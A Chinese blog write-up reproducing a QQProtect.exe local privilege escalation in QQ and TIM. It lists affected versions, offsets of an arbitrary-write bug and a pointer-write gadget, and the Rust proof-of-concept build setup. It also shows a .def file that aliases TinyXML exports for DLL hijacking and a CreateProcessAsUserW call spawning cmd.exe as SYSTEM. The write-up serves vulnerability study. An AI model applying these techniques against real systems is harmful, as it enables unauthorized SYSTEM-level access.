---
title: QQ Elevation复现
date: 2023-07-03 14:19:49
categories: CTF
tags: [CVE]
---

> 利用QQProtect.exe提权，获得NT Authority\SYSTEM权限。

## 漏洞成因：

QQProtect.exe没有使用ASLR保护，篡改函数指针，利用ROP链（Ret Oriented Programming，即修改函数返回指针)实现了任意代码执行。

1.QQProtect.exe+0x40c9f8处，有`任意地址写漏洞`。

待添加自己的截图，网络截图可见：



![image0](QQ%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E/image0.png)

可以在任意地址写入DWORD(1)。

2.QQProtectEngine.dll+0x3B4F6处，

待添加自己的截图，网络截图可见：



![image1](QQ%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E/image1.png)

可以完成对任意地址的指针ptr，偏移2个ptr指针类型大小的位置处，赋值为(unsigned int )(ptr+3)。



Affected Products:

* QQ 9.7.1.28940 ~ 9.7.8.29039
* TIM 3.4.5.22071 ~ 3.4.7.22084

Affected Components:

* QQProtect.exe 4.5.0.9424 (in TIM 3.4.5.22071)
* QQProtect.exe 4.5.0.9426 (in QQ 9.7.1.28940)
* QQProtectEngine.dll 4.5.0.9424 (in TIM 3.4.5.22071)
* QQProtectEngine.dll 4.5.0.9426 (in QQ 9.7.1.28940)

## POC

POC整体用rust构建，先来解析配置文件里的内容。

### 1.配置文件解析

针对32位系统使用静态链接的C运行时，构建可执行文件。

```sh
cargo +stable-i686-pc-windows-msvc build --release --config "build.rustflags = [\"-C\", \"target-feature=+crt-static\"]"
```

对应的toml文件

```toml
[profile.release]
opt-level = 3

[profile.release.overrides.'cfg(target_os = "windows")']
rustflags = ["-C", "target-feature=+crt-static"]
```

此时，只需要`cargo build --release`即可。

开发过程中，要利用一些依赖库，来调用Windows API、服务和命令行参数。

```toml
[dependencies.rhexdump]
version = "0.1.1"

[dependencies.windows]
version = "0.44.0"
features = [
    "Win32_Foundation",
    "Win32_System_LibraryLoader",
    "Win32_System_Threading",
    "Win32_System_SystemServices",
    "Win32_System_Console"
]

[dependencies.windows-service]
version = "0.5.0"

[dependencies.windows-args]
version = "0.2.0"

#生成动态链接库，即dll文件
[lib]
crate-type = ["cdylib"]

```

2.定义的`src\lib.def`文件中的导出符号。

### C++名称修饰规则

 C++ 的名称修饰规则，也称为名称重整（name mangling）。用于编译器生成符号表，会因平台和编译器有所不同。它将函数和变量的名称、参数类型、返回类型等信息编码成一个唯一的符号。 

名称修饰的目的是确保在**链接阶段可以正确地解析函数和变量的符号，避免符号冲突和重复定义的问题。**  为了实现不同编程语言之间的互操作性，可以使用 `extern "C"` 来指定使用 C 风格的符号。

>导出符号的格式是 `?SymbolName@ClassName@@FunctionSignature=_alias@0` 



下面的文件规定了导出的类和符号命，并 将所有导出符号重命名为 `_die`。 

```def
LIBRARY
EXPORTS
    ?NextSiblingElement@TiXmlNode@@QAEPAVTiXmlElement@@PBD@Z=_die@0
    ?FirstChildElement@TiXmlNode@@QAEPAVTiXmlElement@@PBD@Z=_die@0
    ??1TiXmlDocument@@UAE@XZ=_die@0
    ?RootElement@TiXmlDocument@@QAEPAVTiXmlElement@@XZ=_die@0
    ?GetText@TiXmlElement@@QBEPBDXZ=_die@0
    ?Attribute@TiXmlElement@@QBEPBDPBD@Z=_die@0
    ?Attribute@TiXmlElement@@QBEPBDPBDPAH@Z=_die@0
    ?LoadXML@TiXmlDocument@@QAE_NPADHW4TiXmlEncoding@@@Z=_die@0
    ??0TiXmlDocument@@QAE@XZ=_die@0
    DllMain

```


 `QAE` 指示该构造函数是一个非静态成员函数，

- `QB` 表示该函数是一个非静态成员函数，并且返回一个指针。
- `EPBD` 表示函数的第一个参数是一个 `const char*` 类型的指针。
- `PAH` 表示函数的第二个参数是一个 `int*` 类型的指针。
-  `PAVTiXmlElement 表示返回类型是一个指向 `TiXmlElement` 类的指针。 
- `0TiXmlDocument@@QAE@XZ`中0表示该类的默认构造函数
-  `@Z`：函数参数的结尾标记 ，`XZ` 表示该构造函数不接受任何参数。 



### 代码解析

```rust
CreateProcessAsUserW(token2, None, PWSTR("cmd.exe".encode_utf16().chain(Some(0)).collect::<Vec<u16>>().as_mut_ptr()), None, None, FALSE, PROCESS_CREATION_FLAGS(0), None, None, &si, &mut pi).ok().unwrap();
```

